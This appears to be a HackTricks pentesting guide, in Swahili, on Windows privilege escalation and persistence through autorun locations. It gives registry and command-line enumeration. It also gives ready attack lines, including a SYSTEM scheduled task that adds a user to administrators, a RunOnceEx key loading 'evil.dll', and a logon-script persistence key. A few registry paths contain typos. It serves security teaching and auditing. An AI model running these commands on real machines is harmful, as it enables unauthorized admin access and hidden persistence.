# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** inaweza kutumika kuendesha programu wakati wa **startup**. Tazama ni binaries zipi zimepangwa kuendeshwa wakati wa startup kwa kutumia:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** zinaweza kupangwa kuendeshwa kwa **marudio fulani**. Tazama ni binaries zipi zimepangwa kuendeshwa kwa:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folda

Binaries zote zilizo katika **Startup folders zitatekelezwa wakati wa kuwasha mfumo**. Startup folders za kawaida ni zile zilizoorodheshwa hapa chini, lakini Startup folder imeonyeshwa kwenye registry. [Soma hapa ili ujifunze ilipo.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Vulnerabilities za *path traversal* wakati wa archive extraction (kama ile iliyotumiwa vibaya katika WinRAR kabla ya 7.13 – CVE-2025-8088) zinaweza kutumiwa **kuweka payloads moja kwa moja ndani ya folda hizi za Startup wakati wa decompression**, na hivyo kusababisha code execution mtumiaji atakapoingia tena kwenye mfumo. Kwa uchambuzi wa kina kuhusu technique hii tazama:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Kumbuka kuanzia hapa](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Ingizo la **Wow6432Node** kwenye Registry linaonyesha kuwa unatumia toleo la Windows lenye biti 64. Operating system hutumia key hii kuonyesha mwonekano tofauti wa HKEY_LOCAL_MACHINE\SOFTWARE kwa applications zenye biti 32 zinazoendeshwa kwenye matoleo ya Windows yenye biti 64.

### Runs

**AutoRun** inayojulikana kwa kawaida:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys zinazojulikana kama **Run** na **RunOnce** zimeundwa ili ku-execute programs automatically kila wakati mtumiaji anapoingia kwenye mfumo. Command line iliyowekwa kama data value ya key haiwezi kuzidi characters 260.<sup>[[2]](#references)</sup>

**Service runs** (zinaweza kudhibiti automatic startup ya services wakati wa boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Kwenye Windows Vista na matoleo ya baadaye, Registry keys za **Run** na **RunOnce** hazitengenezwi automatically. Entries katika keys hizi zinaweza kuanzisha programs moja kwa moja au kuzibainisha kama dependencies. Kwa mfano, ili kupakia DLL file wakati wa logon, mtu anaweza kutumia Registry key ya **RunOnceEx** pamoja na key ya "Depend". Hili linaonyeshwa kwa kuongeza Registry entry ya ku-execute "C:\temp\evil.dll" wakati wa system start-up:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Ikiwa unaweza kuandika ndani ya registry yoyote iliyotajwa ndani ya **HKLM**, unaweza ku-escalate privileges mtumiaji tofauti anapoingia.

> [!TIP]
> **Exploit 2**: Ikiwa unaweza ku-overwrite binary yoyote iliyoonyeshwa kwenye registry yoyote ndani ya **HKLM**, unaweza kurekebisha binary hiyo kwa backdoor mtumiaji tofauti anapoingia na ku-escalate privileges.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts zilizowekwa kwenye folda ya **Startup** zitasababisha services au applications kuanza kiotomatiki wakati wa user logon au system reboot. Mahali ilipo folda ya **Startup** hufafanuliwa kwenye registry kwa scope za **Local Machine** na **Current User**. Hii inamaanisha kuwa shortcut yoyote iliyoongezwa kwenye maeneo haya maalum ya **Startup** itahakikisha kuwa service au program iliyounganishwa inaanza baada ya mchakato wa logon au reboot, hivyo kuwa njia rahisi ya kupanga programs ziendeshe kiotomatiki.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Ikiwa unaweza kuandika upya \[User] Shell Folder yoyote chini ya **HKLM**, utaweza kuielekeza kwenye folda unayoidhibiti na kuweka backdoor ambayo itatekelezwa kila mtumiaji anapoingia kwenye mfumo, na hivyo kufanya privilege escalation.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Thamani hii ya registry ya kila mtumiaji inaweza kuelekeza kwenye script au command inayotekelezwa mtumiaji huyo anapo-log on. Hutumika hasa kama primitive ya **persistence** kwa sababu huendeshwa tu katika context ya mtumiaji aliyeathiriwa, lakini bado inafaa kukaguliwa wakati wa post-exploitation na ukaguzi wa autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Ikiwa unaweza kuandika thamani hii kwa mtumiaji wa sasa, unaweza kuanzisha tena execution wakati wa interactive logon inayofuata bila kuhitaji admin rights. Ikiwa unaweza kuiandika kwenye hive ya mtumiaji mwingine, unaweza kupata code execution mtumiaji huyo anapo-log on.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes:

- Pendelea full paths za `.bat`, `.cmd`, `.ps1`, au launcher files nyingine ambazo tayari zinaweza kusomwa na target user.
- Hii hudumu baada ya logoff/reboot hadi value iondolewe.
- Tofauti na `HKLM\...\Run`, hii **haitoi elevation** yenyewe; ni user-scope persistence.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kwa kawaida, **Userinit** key huwekwa kuwa **userinit.exe**. Hata hivyo, ikiwa key hii itabadilishwa, executable iliyobainishwa pia itazinduliwa na **Winlogon** wakati wa user logon. Vivyo hivyo, **Shell** key imekusudiwa kuelekeza kwenye **explorer.exe**, ambayo ndiyo default shell ya Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Ikiwa unaweza kuandika upya registry value au binary, utaweza kuongeza privileges.

### Mipangilio ya Policy

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kagua **Run** key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Kubadilisha Safe Mode Command Prompt

Katika Windows Registry chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** ambayo kwa default imewekwa kuwa `cmd.exe`. Hii inamaanisha kwamba unapochagua "Safe Mode with Command Prompt" wakati wa kuwasha mfumo (kwa kubonyeza F8), `cmd.exe` hutumika. Hata hivyo, inawezekana kusanidi computer yako ianze kiotomatiki katika mode hii bila kuhitaji kubonyeza F8 na kuichagua manually.

Hatua za kuunda boot option ya kuanza kiotomatiki katika "Safe Mode with Command Prompt":<sup>[[5]](#references)</sup>

1. Badilisha attributes za faili ya `boot.ini` ili kuondoa flags za read-only, system na hidden: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` kwa ajili ya ku-edit.
3. Ingiza mstari kama huu: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Rejesha attributes za awali za faili: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Kubadilisha registry key ya **AlternateShell** huruhusu kusanidi custom command shell, hali ambayo inaweza kutumiwa kupata unauthorized access.
- **Exploit 2 (PATH Write Permissions):** Kuwa na write permissions kwenye sehemu yoyote ya system **PATH** variable, hasa kabla ya `C:\Windows\system32`, hukuruhusu ku-execute custom `cmd.exe`, ambayo inaweza kuwa backdoor ikiwa mfumo utaanzishwa katika Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Kuwa na write access kwenye `boot.ini` huwezesha mfumo kuanza kiotomatiki katika Safe Mode, jambo linalorahisisha unauthorized access wakati wa reboot inayofuata.

Ili kuangalia setting ya sasa ya **AlternateShell**, tumia commands hizi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Component Iliyosakinishwa

Active Setup ni feature ya Windows ambayo **huanzishwa kabla mazingira ya desktop hayajapakiwa kikamilifu**. Hupewa kipaumbele katika utekelezaji wa commands fulani, ambazo lazima zikamilike kabla user logon kuendelea. Mchakato huu hutokea hata kabla startup entries nyingine, kama zile zilizo katika sehemu za registry za Run au RunOnce, kuanzishwa.

Active Setup inadhibitiwa kupitia registry keys zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya keys hizi kuna subkeys mbalimbali, kila moja ikihusishwa na component maalum. Key values muhimu ni pamoja na:

- **IsInstalled:**
- `0` inaonyesha kuwa command ya component haitatekelezwa.
- `1` inaonyesha kuwa command itatekelezwa mara moja kwa kila user; hii ndiyo tabia chaguo-msingi ikiwa value ya `IsInstalled` haipo.
- **StubPath:** Hubainisha command itakayotekelezwa na Active Setup. Inaweza kuwa command line yoyote halali, kama vile kuanzisha `notepad`.

**Security Insights:**

- Kubadilisha au kuandika kwenye key ambayo **`IsInstalled`** imewekwa kuwa `"1"` pamoja na **`StubPath`** maalum kunaweza kusababisha command execution isiyoidhinishwa, na huenda ikatumika kwa privilege escalation.
- Kubadilisha binary file inayorejelewa katika value yoyote ya **`StubPath`** kunaweza pia kusababisha privilege escalation, ikiwa permissions za kutosha zinapatikana.

Ili kukagua configurations za **`StubPath`** katika Active Setup components, commands hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Muhtasari wa Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) ni DLL modules zinazoongeza vipengele vya ziada kwenye Microsoft's Internet Explorer. Hupakia ndani ya Internet Explorer na Windows Explorer kila zinapoanzishwa. Hata hivyo, utekelezaji wao unaweza kuzuiwa kwa kuweka **NoExplorer** key kuwa 1, hivyo kuwazuia kupakia pamoja na instances za Windows Explorer.<sup>[[1]](#references)</sup>

BHOs zinaoana na Windows 10 kupitia Internet Explorer 11, lakini hazitumiki kwenye Microsoft Edge, browser chaguo-msingi katika matoleo mapya ya Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua registry keys zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO inawakilishwa na **CLSID** yake kwenye registry, inayotumika kama kitambulisho cha kipekee. Maelezo ya kina kuhusu kila CLSID yanaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Kwa querying BHOs kwenye registry, commands hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Viendezi vya Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kumbuka kuwa registry itakuwa na registry 1 mpya kwa kila dll, na itawakilishwa na **CLSID**. Unaweza kupata taarifa za CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Viendeshi vya Fonti

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Amri ya Open

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Kumbuka kwamba maeneo yote unayoweza kupata autoruns tayari yamechunguzwa na [ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, kwa ajili ya orodha pana zaidi ya faili zinazotekelezwa kiotomatiki, unaweza kutumia [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)kutoka systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Zaidi

**Pata Autoruns zaidi kama vile registries katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Marejeo

- [1] [Mbinu za kawaida za persistence za malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot au Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot au Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Ninawezaje kuongeza boot option inayoanzisha alternate shell?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
